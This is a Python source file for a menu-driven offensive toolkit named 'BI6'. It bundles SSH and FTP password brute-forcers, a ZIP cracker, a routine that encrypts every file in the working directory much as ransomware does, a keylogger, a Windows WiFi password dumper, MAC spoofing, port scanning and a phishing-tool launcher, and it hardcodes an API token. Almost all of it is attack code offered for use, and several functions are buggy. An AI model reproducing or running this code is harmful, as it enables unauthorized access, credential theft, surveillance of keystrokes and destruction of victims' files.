#!/usr/bin/python

#if the above code doesn't work go to your terminal and run: which python then, replace `/usr/bin/python` with the python path



import os
import zipfile
import tqdm
import time
import socket
import nmap
from faker import Faker
from faker.providers import internet
from cryptography.fernet import Fernet
import subprocess
import ipinfo
#196.216.144.9
import sys
import codecs
import subprocess
import string
import random
import re
import ftplib
from threading import Thread
import queue
from colorama import Fore, init
from pynput import keyboard
import paramiko

def bi6():
    

    print('Welcome to BI6')
    
    def crackSSH():
        init()
        GREEN = Fore.GREEN
        RED   = Fore.RED
        RESET = Fore.RESET
        BLUE  = Fore.BLUE
        wordlist = input('Path to wordlist : ')
        hostname = input('Host : ')
        username = input('username : ')
        usrport = int(input('Port : '))
        passwords = codecs.open(wordlist, 'r', encoding='utf-8', errors='ignore').read().split("\n")
        def is_ssh_open():
            
            
            
            
        # initialize SSH client
            client = paramiko.SSHClient()
            # add to know hosts
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(hostname=hostname, port=usrport , username=username, password=password, timeout=3)
            except socket.timeout:
                # this is when host is unreachable
                print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
                return False
            except paramiko.AuthenticationException:
                print(f"[!] Invalid credentials for {username}:{password}")
                return False
            except paramiko.SSHException:
                print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
                # sleep for a minute
                time.sleep(60)
                return is_ssh_open()
            else:
                # connection was established successfully
                print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
                return True
        for password in passwords:
            if is_ssh_open():
            # if combo is valid, save it to a file
                open("credentials.txt", "w").write(f"{username}@{hostname}:{password}")
                break
    def crackFtp():
        global q
        q = queue.Queue()
        # number of threads to spawn
        n_threads = 30
        # hostname or IP address of the FTP server
        host = input('FTP Server Address : ')
        # username of the FTP server, root as default for linux
        user = input('username : ')
        # port of FTP, aka 21
        port = int(input('Port : '))

        def connect_ftp():
            wordlist = input('Path to wordlist : ')
        
            while True:
                # get the password from the queue
                password = q.get()
                # initialize the FTP server object
                server = ftplib.FTP()
                print("[!] Trying", password)
                try:
                    # tries to connect to FTP server with a timeout of 5
                    server.connect(host, port, timeout=5)
                    # login using the credentials (user & password)
                    server.login(user, password)
                except ftplib.error_perm:
                    # login failed, wrong credentials
                    pass
                else:
                    # correct credentials
                    print(f"{Fore.GREEN}[+] Found credentials: ")
                    print(f"\tHost: {host}")
                    print(f"\tUser: {user}")
                    print(f"\tPassword: {password}{Fore.RESET}")
                    # we found the password, let's clear the queue
                    with q.mutex:
                        q.queue.clear()
                        q.all_tasks_done.notify_all()
                        q.unfinished_tasks = 0
                finally:
                    # notify the queue that the task is completed for this password
                    q.task_done()

                # read the wordlist of passwords
                passwords = open(wordlist).read().split("\n")
                print("[+] Passwords to try:", len(passwords))
                # put all passwords to the queue
                for password in passwords:
                    q.put(password)
                # create `n_threads` that runs that function
                for t in range(n_threads):
                    thread = Thread(target=connect_ftp)
                    # will end when the main thread end
                    thread.daemon = True
                    thread.start()
                # wait for the queue to be empty
                q.join()
    
    def crackZip():
        wordlist = input('Path to wordlist : ')
        # the password list path you want to use, must be available in the current directory
        
        # the zip file you want to crack its password
        zip_file = input('Zip Name ')
        # initialize the Zip File object
        zip_file = zipfile.ZipFile(zip_file + '.zip')
        # count the number of words in this wordlist
        n_words = len(list(open(wordlist, "rb")))
        passwords = codecs.open(wordlist, 'r', encoding='utf-8', errors='ignore')
        
        # print the total number of passwords
        print("Total passwords to test:", n_words)
        for password in passwords:
            try:
                zip_file.extractall(pwd=password)
            except:
                print(f'[!] Wrong password: {password}')
                pass
                
                    
            else:
                print(f"[+] Password found: {password}")
                exit(0)
            
        
            
    
    
    def lockFiles():
        files = []
        prompt = ""
        for file in os.listdir():
            
            if file == 'main.py' or file == 'thekey.key':
                continue
            if os.path.isfile(file): 
                files.append(file)
                
        print('Locked.')
        print(prompt)
        print(files)
        
        key = Fernet.generate_key()
        with open('thekey.key', 'wb') as thekey:
            thekey.write(key)
        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(contents_encrypted)
                
    def unlockFiles():
        files = []
        for file in os.listdir():
            
            if file == 'main.py' or file == 'thekey.key':
                continue
            if os.path.isfile(file): 
                files.append(file)
                
        print('Unlocked.')
        print(files)
        with open('theKey.key', 'rb') as key:
            secretKey = key.read()
        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
                contents_decrypted = Fernet(secretKey).decrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(contents_decrypted)
            
    def get_random_macos_address():
        """Generate and return a MAC address in the format of Linux"""
    # get the hexdigits uppercased
        uppercased_hexdigits = ''.join(set(string.hexdigits.upper()))
        # 2nd character must be 0, 2, 4, 6, 8, A, C, or E
        mac = ""
        for i in range(6):
            for j in range(2):
                if i == 0:
                    mac += random.choice("02468ACE")
                else:
                    mac += random.choice(uppercased_hexdigits)
            mac += ":"
        return mac.strip(":")

    def scanPorts():
        target = input('Targert IP: ')
        begin = input('Begin at: ')
        end = input('Stop At: ')
        
        
        for i in range(int(begin), int(end) + 1):
            res = nmap.PortScanner().scan(target,str(i))
            res = res['scan'][target]['tcp'][i]['state']
            print(f'{target}:{i} Port {res}')
            
    def pyPhisher():
        os.system('pyphisher ')
        
    def keyLog():
        
        keys_list = []
        def key_pressed(key):
            try:
                keys_list.append(key)
                with open('keyLogs.txt', 'wb') as log:
                    log.write(key)
                    
            except:
                pass
        def key_released(key):
            if key == keyboard.Key.esc:
                pass
        
        with keyboard.Listener(on_press=key_pressed, on_release=key_released) as listener:
            listener.join()
            
        
    def ping():
        target = input('Target: ')
        os.system(f'ping {target} ')
    def fakeMe():
        locale = input('locale: ')
        fake = Faker(locale)
        
        fake.add_provider(internet)
        print("Here's your new identity: ")
        print(f'name:' + fake.name())
        print(fake.ipv4_private())
        print(fake.address())
        
    def windowsWifi():
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                print ("{:<30}|  {:<}".format(i, results[0]))
                with open('wifipassword.txt', 'wb') as wifitxt:
                    wifitxt.write(results)
            except :
                print ("{:<30}|  {:<}".format(i, ""))
    def getIpInfo():
        try:
            ip_address = sys.argv[1]
        except :
            ip_address = input('IP Address : ')
        # access token for ipinfo.io
        access_token = 'eb7743c01b91d8'
        # create a client object with the access token
        handler = ipinfo.getHandler(access_token)
        # get the ip info
        details = handler.getDetails(ip_address)
        # print the ip info
        for key, value in details.all.items():
            print(f"{key}: {value}")
            
    def get_current_macos_address(iface):
        # use the ifconfig command to get the interface details, including the MAC address
        output = subprocess.check_output(f"ifconfig {iface}", shell=True).decode()
        return re.search("ether (.+) ", output).group().split()[1].strip()
    def macos_spoofMac():
        mac = input('Preferred Mac Address: ')
        card = input('Network Card: ')
        os.system(f'brew install spoof-mac && sudo spoof-mac set {card} {mac}')
    
    command = input('what do you want to do? : ')
    
    if command == 'lock files':
        lockFiles()
    if command == 'set mac address':
        macos_spoofMac()
    if command == 'get mac address':
        get_current_macos_address()
    elif command == 'unlock files':
        unlockFiles()
    elif command == 'scan ports':
        scanPorts()
    elif command == 'pyPhisher':
        pyPhisher()
    elif command == 'log keys':
        keyLog()
    elif command == 'ping':
        ping()
    elif command == 'crack ssh':
        crackSSH()
    elif command == 'fake identity':
        fakeMe()
    elif command == 'win wifi':
        windowsWifi()
    elif command == 'get ip info':
        getIpInfo()
    elif command == 'randomize mac':
        get_random_macos_address()
    elif command == 'crack zip':
        crackZip()
    elif command == 'crack ftp':
        crackFtp()
    elif command == 'help':
        print(''''lock files' : Lock all files in the current directory
    'set mac address' : Set MacOS Mac address
    'crack zip' : BruteForce Zip file
    'crack ssh' : BruteForce SSH
    'crack ftp' : Bruteforce Ftp server
    'unlock files' : Unlock locked files
    'scan ports' : Scan Ports
    'pyPhisher' : Launch PyPhisher
    'log keys' : Key logger
    'ping' : Ping addresses
    'fake identity' : Creates a fake identity
    'win wifi' : get windows Wifi passwords
    'get ip info' : Get information on public IP Addresses
    'randomize mac' : randomize macos mac address''')
    else:
        print('Command Not found')
        bi6()
        
bi6()    
